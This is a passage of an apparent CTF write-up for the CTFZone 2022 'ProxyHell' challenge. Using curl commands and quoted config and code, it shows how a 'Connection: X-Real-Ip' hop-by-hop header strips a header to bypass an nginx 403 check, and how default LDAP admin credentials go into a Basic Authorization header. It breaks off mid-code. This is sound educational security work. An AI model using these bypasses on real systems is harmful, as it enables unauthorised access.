<!DOCTYPE html>
<html><head>
	<meta charset="utf-8" />
	<meta http-equiv="X-UA-Compatible" content="IE=edge"><title>[CTFZone 2022] ProxyHell - Empty</title><meta name="viewport" content="width=device-width, initial-scale=1">
	<meta name="description" content="We can&#39;t change our old infrastructure, so we&#39;re using 4 proxies to access the flag. What could possibly go wrong?" />
	<meta property="og:image" content=""/>
	<meta property="og:title" content="[CTFZone 2022] ProxyHell" />
<meta property="og:description" content="We can&#39;t change our old infrastructure, so we&#39;re using 4 proxies to access the flag. What could possibly go wrong?" />
<meta property="og:type" content="article" />
<meta property="og:url" content="/post/proxyhell/" /><meta property="article:section" content="post" />
<meta property="article:published_time" content="2022-08-27T00:00:00+00:00" />
<meta property="article:modified_time" content="2022-08-27T00:00:00+00:00" />

<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="[CTFZone 2022] ProxyHell"/>
<meta name="twitter:description" content="We can&#39;t change our old infrastructure, so we&#39;re using 4 proxies to access the flag. What could possibly go wrong?"/>
<script src="js/feather.min.js"></script>
	
	
        <link href="/css/fonts.b685ac6f654695232de7b82a9143a46f9e049c8e3af3a21d9737b01f4be211d1.css" rel="stylesheet">
	

	
	<link rel="stylesheet" type="text/css" media="screen" href="/css/main.4ddabd7503f7a39f08b1332805fc618e47fe65490f3c282a3dad46df59697a76.css" />
		<link id="darkModeStyle" rel="stylesheet" type="text/css" href="/css/dark.1b1ad67986b5fb2bdf5cdb491e362b3f0a64f1604dde010230e849731b54e308.css"   />
	
	
	
		
		
		<link rel="stylesheet" type="text/css" href="/css/custom.cc7145a74b085829cf7d0439eac46ecfdb25c97969e01198fb9417e77591b0b8.css">
		
</head>
<body>
        <div class="content"><header>
	<div class="main">
		<a href="">Empty</a>
	</div>
	<nav>
		
		<a href="/">Home</a>
		
		<a href="/ctf">CTF writeups</a>
		
		<a href="/vulnerabilities">Vulnerabilities</a>
		
		<a href="/tools">Tools</a>
		
		
	</nav>
</header>

<main>
	<article>
		<div class="title">
			<h1 class="title">[CTFZone 2022] ProxyHell</h1>
			<div class="meta">Posted on Aug 27, 2022</div>
		</div>
		

		<section class="body">
			<p><img src="/images/Kf0vgmuWZ4v3jdLAgTMCQWuDehuH2rAM" alt="img"></p>
<p>I do like proxy-related challenges, so I decided to share my solution for the <a href="https://ctf.bi.zone">CTFZone</a> ProxyHell challenge. Despite it wasnâ€™t a hard task, only 3 teams solved it in the end.</p>
<h2 id="initial-observing">Initial observing</h2>
<p>We have a <code>docker-compose.yml</code> file with 5 images - <strong>apache</strong>, <strong>varnish</strong>, <strong>nginx-ldap</strong>, <strong>nginx</strong>, <strong>openldap</strong>. If we do <code>grep -r flag</code>, we will see that the flag is within the <code>index.html</code> page: <code>app/index.html:&lt;h1&gt;CTFZone{Test_flag}&lt;/h1&gt;</code>. If we try to access the root of the server &ndash; we will get a <strong>403 forbidden</strong> error:</p>
<div class="highlight"><pre tabindex="0" style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>% curl http://proxyhell.ctfz.one/
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>&lt;<span style="color:#5bc4bf">html</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#5bc4bf">head</span>&gt;&lt;<span style="color:#5bc4bf">title</span>&gt;403 Forbidden&lt;/<span style="color:#5bc4bf">title</span>&gt;&lt;/<span style="color:#5bc4bf">head</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#5bc4bf">body</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#5bc4bf">center</span>&gt;&lt;<span style="color:#5bc4bf">h1</span>&gt;403 Forbidden&lt;/<span style="color:#5bc4bf">h1</span>&gt;&lt;/<span style="color:#5bc4bf">center</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#5bc4bf">hr</span>&gt;&lt;<span style="color:#5bc4bf">center</span>&gt;nginx&lt;/<span style="color:#5bc4bf">center</span>&gt;
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#5bc4bf">body</span>&gt;
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#5bc4bf">html</span>&gt;
</span></span></code></pre></div><p>Let&rsquo;s try to find what part of the application causes this error:</p>
<div class="highlight"><pre tabindex="0" style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>% grep -r <span style="color:#f99b15">403</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>conf/ldap_nginx.conf:            <span style="color:#815ba4">return</span> 403;
</span></span></code></pre></div><p>And <code>conf/ldap_nginx.conf</code> looks like:</p>
<div class="highlight"><pre tabindex="0" style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python3" data-lang="python3"><span style="display:flex;"><span>server {
</span></span><span style="display:flex;"><span>      listen <span style="color:#f99b15">0.0.0.0</span>:<span style="color:#f99b15">8080</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      location <span style="color:#5bc4bf">=</span> <span style="color:#5bc4bf">/</span> {
</span></span><span style="display:flex;"><span>      <span style="color:#815ba4">if</span> (<span style="color:#ef6155">$</span>http_x_real_ip) { <span style="color:#776e71">#!</span>
</span></span><span style="display:flex;"><span>            <span style="color:#815ba4">return</span> <span style="color:#f99b15">403</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>         auth_request <span style="color:#5bc4bf">/</span>auth<span style="color:#5bc4bf">-</span>proxy;
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      location <span style="color:#5bc4bf">=</span> <span style="color:#5bc4bf">/</span>auth<span style="color:#5bc4bf">-</span>proxy {
</span></span><span style="display:flex;"><span>         internal;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>         proxy_pass http:<span style="color:#5bc4bf">//</span>nginx<span style="color:#5bc4bf">-</span>ldap:<span style="color:#f99b15">8888</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>As we can see - the nginx throws 403 error in case the <code>X-Real-Ip</code> header is set.</p>
<p>It is set by varnish:</p>
<p><code>varnish/default.vcl:</code></p>
<div class="highlight"><pre tabindex="0" style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python3" data-lang="python3"><span style="display:flex;"><span><span style="color:#5bc4bf">...</span>
</span></span><span style="display:flex;"><span>sub vcl_recv {
</span></span><span style="display:flex;"><span>    <span style="color:#815ba4">if</span> (req<span style="color:#5bc4bf">.</span>method <span style="color:#5bc4bf">!=</span> <span style="color:#48b685">&#34;GET&#34;</span> <span style="color:#5bc4bf">&amp;&amp;</span> req<span style="color:#5bc4bf">.</span>method <span style="color:#5bc4bf">!=</span> <span style="color:#48b685">&#34;HEAD&#34;</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#815ba4">return</span> (<span style="color:#815ba4">pass</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#815ba4">if</span> (req<span style="color:#5bc4bf">.</span>http<span style="color:#5bc4bf">.</span>cookie <span style="color:#5bc4bf">~</span> <span style="color:#48b685">&#34;^\s*$&#34;</span>) {
</span></span><span style="display:flex;"><span>        unset req<span style="color:#5bc4bf">.</span>http<span style="color:#5bc4bf">.</span>cookie;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    set req<span style="color:#5bc4bf">.</span>http<span style="color:#5bc4bf">.</span>X<span style="color:#5bc4bf">-</span>Real<span style="color:#5bc4bf">-</span>Ip <span style="color:#5bc4bf">=</span> client<span style="color:#5bc4bf">.</span>ip; <span style="color:#776e71">#!</span>
</span></span><span style="display:flex;"><span>    var<span style="color:#5bc4bf">.</span>global_set(<span style="color:#48b685">&#34;conn_string&#34;</span>, req<span style="color:#5bc4bf">.</span>http<span style="color:#5bc4bf">.</span>connection);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#5bc4bf">...</span>
</span></span></code></pre></div><h2 id="hop-by-hop-headers">Hop-by-hop headers</h2>
<p>After seeing this condition, I tried to bypass it using the <code>Connection: X-Real-Ip</code> header, and it worked:</p>
<div class="highlight"><pre tabindex="0" style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>% curl http://proxyhell.ctfz.one/ -H &#34;Connection: X-Real-Ip&#34;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>&lt;<span style="color:#5bc4bf">html</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#5bc4bf">head</span>&gt;&lt;<span style="color:#5bc4bf">title</span>&gt;401 Authorization Required&lt;/<span style="color:#5bc4bf">title</span>&gt;&lt;/<span style="color:#5bc4bf">head</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#5bc4bf">body</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#5bc4bf">center</span>&gt;&lt;<span style="color:#5bc4bf">h1</span>&gt;401 Authorization Required&lt;/<span style="color:#5bc4bf">h1</span>&gt;&lt;/<span style="color:#5bc4bf">center</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#5bc4bf">hr</span>&gt;&lt;<span style="color:#5bc4bf">center</span>&gt;nginx&lt;/<span style="color:#5bc4bf">center</span>&gt;
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#5bc4bf">body</span>&gt;
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#5bc4bf">html</span>&gt;
</span></span></code></pre></div><p>It works because the <code>Connection</code> header is treated as <strong>hop-by-hop</strong> in <strong>HTTP/1.1</strong>. It means the proxy itself should consume the header and not forward it further. So it turned out that one of the proxies in the chain decided to follow the rules and removed the <code>X-Real-Ip</code> from the request, so we got another error.</p>
<p>Here is a great blog post explaining the hop-by-hop headers - <a href="https://nathandavison.com/blog/abusing-http-hop-by-hop-request-headers">Abusing HTTP hop-by-hop request headers</a></p>
<h2 id="ldap-server">Ldap server</h2>
<p>Let&rsquo;s see what is causing the error this time:</p>
<div class="highlight"><pre tabindex="0" style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>% grep -r <span style="color:#f99b15">401</span>
</span></span><span style="display:flex;"><span>nginx-ldap/nginx-ldap-auth-daemon.py:            self.send_response<span style="color:#5bc4bf">(</span>401<span style="color:#5bc4bf">)</span>
</span></span><span style="display:flex;"><span>nginx-ldap/nginx-ldap-auth-daemon.py:        self.send_response<span style="color:#5bc4bf">(</span>401<span style="color:#5bc4bf">)</span>
</span></span></code></pre></div><p>The file <code>nginx-ldap/nginx-ldap-auth-daemon.py</code> has the following structure:</p>
<div class="highlight"><pre tabindex="0" style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#815ba4">class</span> <span style="color:#fec418">AuthHandler</span>(BaseHTTPRequestHandler)
</span></span><span style="display:flex;"><span>    <span style="color:#815ba4">def</span> <span style="color:#06b6ef">do_GET</span>(self)
</span></span><span style="display:flex;"><span>    <span style="color:#815ba4">def</span> <span style="color:#06b6ef">get_params</span>(self)
</span></span><span style="display:flex;"><span>    <span style="color:#815ba4">def</span> <span style="color:#06b6ef">get_cookie</span>(self, name)
</span></span><span style="display:flex;"><span>    <span style="color:#815ba4">def</span> <span style="color:#06b6ef">auth_failed</span>(self, ctx, errmsg<span style="color:#5bc4bf">=</span><span style="color:#815ba4">None</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#815ba4">class</span> <span style="color:#fec418">LDAPAuthHandler</span>(AuthHandler)
</span></span><span style="display:flex;"><span>    params <span style="color:#5bc4bf">=</span> {<span style="color:#5bc4bf">..</span>}
</span></span><span style="display:flex;"><span>    <span style="color:#815ba4">def</span> <span style="color:#06b6ef">do_GET</span>(self)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#815ba4">def</span> <span style="color:#06b6ef">main</span>()
</span></span></code></pre></div><p>omitting some useless functions.</p>
<p>After a few minutes of setting up <code>print's()</code>, I found that the <code>AuthHandler -&gt; do_GET(self)</code> function causes the error:</p>
<div class="highlight"><pre tabindex="0" style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#815ba4">class</span> <span style="color:#fec418">AuthHandler</span>(BaseHTTPRequestHandler)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span> <span style="color:#815ba4">def</span> <span style="color:#06b6ef">do_GET</span>(self):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        ctx <span style="color:#5bc4bf">=</span> self<span style="color:#5bc4bf">.</span>ctx
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        ctx[<span style="color:#48b685">&#39;action&#39;</span>] <span style="color:#5bc4bf">=</span> <span style="color:#48b685">&#39;input parameters check&#39;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#815ba4">for</span> k, v <span style="color:#5bc4bf">in</span> self<span style="color:#5bc4bf">.</span>get_params()<span style="color:#5bc4bf">.</span>items():
</span></span><span style="display:flex;"><span>            ctx[k] <span style="color:#5bc4bf">=</span> self<span style="color:#5bc4bf">.</span>headers<span style="color:#5bc4bf">.</span>get(v[<span style="color:#f99b15">0</span>], v[<span style="color:#f99b15">1</span>])
</span></span><span style="display:flex;"><span>            <span style="color:#815ba4">if</span> ctx[k] <span style="color:#5bc4bf">==</span> <span style="color:#815ba4">None</span>:
</span></span><span style="display:flex;"><span>                self<span style="color:#5bc4bf">.</span>auth_failed(ctx, <span style="color:#48b685">&#39;required &#34;</span><span style="color:#f99b15">%s</span><span style="color:#48b685">&#34; header was not passed&#39;</span> <span style="color:#5bc4bf">%</span> k)
</span></span><span style="display:flex;"><span>                <span style="color:#815ba4">return</span> <span style="color:#815ba4">True</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        ctx[<span style="color:#48b685">&#39;action&#39;</span>] <span style="color:#5bc4bf">=</span> <span style="color:#48b685">&#39;performing authorization&#39;</span>
</span></span><span style="display:flex;"><span>        auth_header <span style="color:#5bc4bf">=</span> self<span style="color:#5bc4bf">.</span>headers<span style="color:#5bc4bf">.</span>get(<span style="color:#48b685">&#39;Authorization&#39;</span>) <span style="color:#776e71">#!</span>
</span></span><span style="display:flex;"><span>        auth_cookie <span style="color:#5bc4bf">=</span> self<span style="color:#5bc4bf">.</span>get_cookie(ctx[<span style="color:#48b685">&#39;cookiename&#39;</span>])
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#815ba4">if</span> auth_cookie <span style="color:#5bc4bf">!=</span> <span style="color:#815ba4">None</span> <span style="color:#5bc4bf">and</span> auth_cookie <span style="color:#5bc4bf">!=</span> <span style="color:#48b685">&#39;&#39;</span>:
</span></span><span style="display:flex;"><span>            auth_header <span style="color:#5bc4bf">=</span> <span style="color:#48b685">&#34;Basic &#34;</span> <span style="color:#5bc4bf">+</span> auth_cookie
</span></span><span style="display:flex;"><span>            self<span style="color:#5bc4bf">.</span>log_message(<span style="color:#48b685">&#34;using username/password from cookie </span><span style="color:#f99b15">%s</span><span style="color:#48b685">&#34;</span> <span style="color:#5bc4bf">%</span>
</span></span><span style="display:flex;"><span>                             ctx[<span style="color:#48b685">&#39;cookiename&#39;</span>])
</span></span><span style="display:flex;"><span>        <span style="color:#815ba4">else</span>:
</span></span><span style="display:flex;"><span>            self<span style="color:#5bc4bf">.</span>log_message(<span style="color:#48b685">&#34;using username/password from authorization header&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#815ba4">if</span> auth_header <span style="color:#5bc4bf">is</span> <span style="color:#815ba4">None</span> <span style="color:#5bc4bf">or</span> <span style="color:#5bc4bf">not</span> auth_header<span style="color:#5bc4bf">.</span>lower()<span style="color:#5bc4bf">.</span>startswith(<span style="color:#48b685">&#39;basic &#39;</span>): <span style="color:#776e71">#!</span>
</span></span><span style="display:flex;"><span>            self<span style="color:#5bc4bf">.</span>send_response(<span style="color:#f99b15">401</span>)
</span></span><span style="display:flex;"><span>            self<span style="color:#5bc4bf">.</span>send_header(<span style="color:#48b685">&#39;WWW-Authenticate&#39;</span>, <span style="color:#48b685">&#39;Basic realm=&#34;&#39;</span> <span style="color:#5bc4bf">+</span> ctx[<span style="color:#48b685">&#39;realm&#39;</span>] <span style="color:#5bc4bf">+</span> <span style="color:#48b685">&#39;&#34;&#39;</span>)
</span></span><span style="display:flex;"><span>            self<span style="color:#5bc4bf">.</span>send_header(<span style="color:#48b685">&#39;Cache-Control&#39;</span>, <span style="color:#48b685">&#39;no-cache&#39;</span>)
</span></span><span style="display:flex;"><span>            self<span style="color:#5bc4bf">.</span>end_headers()
</span></span></code></pre></div><p>We&rsquo;re getting a 401 error because <code>self.headers.get('Authorization')</code> is <code>None</code>.
Let&rsquo;s take some credentials from the <code>docker-compose.yml</code> file and try to send a request with this header:</p>
<p><code>docker-compose.yml:</code></p>
<div class="highlight"><pre tabindex="0" style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yaml" data-lang="yaml"><span style="display:flex;"><span><span style="color:#fec418">...</span>
</span></span><span style="display:flex;"><span><span style="color:#5bc4bf">openldap</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#5bc4bf">image</span>: <span style="color:#f99b15">bitnami/openldap</span>
</span></span><span style="display:flex;"><span>    <span style="color:#5bc4bf">expose</span>:
</span></span><span style="display:flex;"><span>      - <span style="color:#48b685">&#34;1389&#34;</span>
</span></span><span style="display:flex;"><span>      - <span style="color:#48b685">&#34;1636&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#5bc4bf">environment</span>:
</span></span><span style="display:flex;"><span>      - <span style="color:#f99b15">LDAP_ADMIN_USERNAME=admin</span>
</span></span><span style="display:flex;"><span>      - <span style="color:#f99b15">LDAP_ADMIN_PASSWORD=adminpassword</span>
</span></span><span style="display:flex;"><span>      - <span style="color:#f99b15">LDAP_USERS=admin</span>
</span></span><span style="display:flex;"><span>      - <span style="color:#f99b15">LDAP_PASSWORDS=adminpassword</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>% echo -n <span style="color:#48b685">&#34;admin:adminpassword&#34;</span> | base64
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ef6155">YWRtaW46YWRtaW5wYXNzd29yZA</span><span style="color:#5bc4bf">==</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>% curl localhost -H &#34;Connection: X-Real-Ip&#34; -H &#34;Authorization: basic YWRtaW46YWRtaW5wYXNzd29yZA==&#34;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>&lt;<span style="color:#5bc4bf">html</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#5bc4bf">body</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#5bc4bf">h1</span>&gt;CTFZone{Test_flag}&lt;/<span style="color:#5bc4bf">h1</span>&gt;
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#5bc4bf">body</span>&gt;
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#5bc4bf">html</span>&gt;
</span></span></code></pre></div><p>We&rsquo;re getting the flag. If we check docker-compose logs, new requests to the ldap server were made:</p>
<p>Without <code>Authorization</code> header:
<img src="/images/HaVyyAev8-I1j9Jh1cq8WXGDs9O5wl2U" alt="img"></p>
<p>With <code>Authorization</code> header:
<img src="/images/MloM3BRMp1tENV9wpp2iPdlOnEtFm52-" alt="img"></p>
<p>But it isn&rsquo;t a solution because the real server has a different admin password.
If we try to supply an invalid password in the <code>Authorization</code> header we are getting the same 401 error, but this time it is caused by <code>AuthHandler -&gt; auth_failed(self, ctx, errmsg=None)</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#815ba4">class</span> <span style="color:#fec418">AuthHandler</span>(BaseHTTPRequestHandler)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span> <span style="color:#815ba4">def</span> <span style="color:#06b6ef">auth_failed</span>(self, ctx, errmsg<span style="color:#5bc4bf">=</span><span style="color:#815ba4">None</span>):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        msg <span style="color:#5bc4bf">=</span> <span style="color:#48b685">&#39;Error while &#39;</span> <span style="color:#5bc4bf">+</span> ctx[<span style="color:#48b685">&#39;action&#39;</span>]
</span></span><span style="display:flex;"><span>        <span style="color:#5bc4bf">...</span>
</span></span><span style="display:flex;"><span>        <span style="color:#815ba4">if</span> ctx<span style="color:#5bc4bf">.</span>get(<span style="color:#48b685">&#39;url&#39;</span>):
</span></span><span style="display:flex;"><span>            msg <span style="color:#5bc4bf">+=</span> <span style="color:#48b685">&#39;, server=&#34;</span><span style="color:#f99b15">%s</span><span style="color:#48b685">&#34;&#39;</span> <span style="color:#5bc4bf">%</span> ctx[<span style="color:#48b685">&#39;url&#39;</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#815ba4">if</span> ctx<span style="color:#5bc4bf">.</span>get(<span style="color:#48b685">&#39;user&#39;</span>):
</span></span><span style="display:flex;"><span>            msg <span style="color:#5bc4bf">+=</span> <span style="color:#48b685">&#39;, login=&#34;</span><span style="color:#f99b15">%s</span><span style="color:#48b685">&#34;&#39;</span> <span style="color:#5bc4bf">%</span> ctx[<span style="color:#48b685">&#39;user&#39;</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        self<span style="color:#5bc4bf">.</span>send_response(<span style="color:#f99b15">401</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#5bc4bf">...</span>
</span></span></code></pre></div><p>And this function is called by <code>LDAPAuthHandler -&gt; do_GET(self)</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#815ba4">class</span> <span style="color:#fec418">LDAPAuthHandler</span>(AuthHandler)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span> <span style="color:#815ba4">def</span> <span style="color:#06b6ef">do_GET</span>(self):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        ctx <span style="color:#5bc4bf">=</span> dict()
</span></span><span style="display:flex;"><span>        self<span style="color:#5bc4bf">.</span>ctx <span style="color:#5bc4bf">=</span> ctx
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        ctx[<span style="color:#48b685">&#39;action&#39;</span>] <span style="color:#5bc4bf">=</span> <span style="color:#48b685">&#39;initializing basic auth handler&#39;</span>
</span></span><span style="display:flex;"><span>        ctx[<span style="color:#48b685">&#39;user&#39;</span>] <span style="color:#5bc4bf">=</span> <span style="color:#48b685">&#39;-&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#5bc4bf">...</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#815ba4">try</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#776e71"># check that uri and baseDn are set</span>
</span></span><span style="display:flex;"><span>            <span style="color:#776e71"># either from cli or a request</span>
</span></span><span style="display:flex;"><span>            <span style="color:#815ba4">if</span> <span style="color:#5bc4bf">not</span> ctx[<span style="color:#48b685">&#39;url&#39;</span>]:
</span></span><span style="display:flex;"><span>                self<span style="color:#5bc4bf">.</span>log_message(<span style="color:#48b685">&#39;LDAP URL is not set!&#39;</span>)
</span></span><span style="display:flex;"><span>                <span style="color:#815ba4">return</span>
</span></span><span style="display:flex;"><span>            <span style="color:#815ba4">if</span> <span style="color:#5bc4bf">not</span> ctx[<span style="color:#48b685">&#39;basedn&#39;</span>]:
</span></span><span style="display:flex;"><span>                self<span style="color:#5bc4bf">.</span>log_message(<span style="color:#48b685">&#39;LDAP baseDN is not set!&#39;</span>)
</span></span><span style="display:flex;"><span>                <span style="color:#815ba4">return</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            ctx[<span style="color:#48b685">&#39;action&#39;</span>] <span style="color:#5bc4bf">=</span> <span style="color:#48b685">&#39;initializing LDAP connection&#39;</span>
</span></span><span style="display:flex;"><span>            ldap_obj <span style="color:#5bc4bf">=</span> ldap<span style="color:#5bc4bf">.</span>initialize(ctx[<span style="color:#48b685">&#39;url&#39;</span>]);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#5bc4bf">...</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            ctx[<span style="color:#48b685">&#39;action&#39;</span>] <span style="color:#5bc4bf">=</span> <span style="color:#48b685">&#39;binding as search user&#39;</span>
</span></span><span style="display:flex;"><span>            print(ctx[<span style="color:#48b685">&#39;binddn&#39;</span>], ctx[<span style="color:#48b685">&#39;bindpasswd&#39;</span>])
</span></span><span style="display:flex;"><span>            ldap_obj<span style="color:#5bc4bf">.</span>bind_s(ctx[<span style="color:#48b685">&#39;binddn&#39;</span>], ctx[<span style="color:#48b685">&#39;bindpasswd&#39;</span>], ldap<span style="color:#5bc4bf">.</span>AUTH_SIMPLE)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            ctx[<span style="color:#48b685">&#39;action&#39;</span>] <span style="color:#5bc4bf">=</span> <span style="color:#48b685">&#39;preparing search filter&#39;</span>
</span></span><span style="display:flex;"><span>            searchfilter <span style="color:#5bc4bf">=</span> ctx[<span style="color:#48b685">&#39;template&#39;</span>] <span style="color:#5bc4bf">%</span> {<span style="color:#48b685">&#39;username&#39;</span>: ctx[<span style="color:#48b685">&#39;user&#39;</span>]}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            self<span style="color:#5bc4bf">.</span>log_message((<span style="color:#48b685">&#39;searching on server &#34;</span><span style="color:#f99b15">%s</span><span style="color:#48b685">&#34; with base dn &#39;</span> <span style="color:#5bc4bf">+</span> \
</span></span><span style="display:flex;"><span>                              <span style="color:#48b685">&#39;&#34;</span><span style="color:#f99b15">%s</span><span style="color:#48b685">&#34; with filter &#34;</span><span style="color:#f99b15">%s</span><span style="color:#48b685">&#34;&#39;</span>) <span style="color:#5bc4bf">%</span>
</span></span><span style="display:flex;"><span>                             (ctx[<span style="color:#48b685">&#39;url&#39;</span>], ctx[<span style="color:#48b685">&#39;basedn&#39;</span>], searchfilter))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            ctx[<span style="color:#48b685">&#39;action&#39;</span>] <span style="color:#5bc4bf">=</span> <span style="color:#48b685">&#39;running search query&#39;</span>
</span></span><span style="display:flex;"><span>            results <span style="color:#5bc4bf">=</span> ldap_obj<span style="color:#5bc4bf">.</span>search_s(ctx[<span style="color:#48b685">&#39;basedn&#39;</span>], ldap<span style="color:#5bc4bf">.</span>SCOPE_SUBTREE,
</span></span><span style="display:flex;"><span>                                        searchfilter, [<span style="color:#48b685">&#39;objectclass&#39;</span>], <span style="color:#f99b15">1</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            ctx[<span style="color:#48b685">&#39;action&#39;</span>] <span style="color:#5bc4bf">=</span> <span style="color:#48b685">&#39;verifying search query results&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            nres <span style="color:#5bc4bf">=</span> len(results)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#815ba4">if</span> nres <span style="color:#5bc4bf">&lt;</span> <span style="color:#f99b15">1</span>:
</span></span><span style="display:flex;"><span>                self<span style="color:#5bc4bf">.</span>auth_failed(ctx, <span style="color:#48b685">&#39;no objects found&#39;</span>)
</span></span><span style="display:flex;"><span>                <span style="color:#815ba4">return</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#815ba4">if</span> nres <span style="color:#5bc4bf">&gt;</span> <span style="color:#f99b15">1</span>:
</span></span><span style="display:flex;"><span>                self<span style="color:#5bc4bf">.</span>log_message(<span style="color:#48b685">&#34;note: filter match multiple objects: </span><span style="color:#f99b15">%d</span><span style="color:#48b685">, using first&#34;</span> <span style="color:#5bc4bf">%</span> nres)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            user_entry <span style="color:#5bc4bf">=</span> results[<span style="color:#f99b15">0</span>]
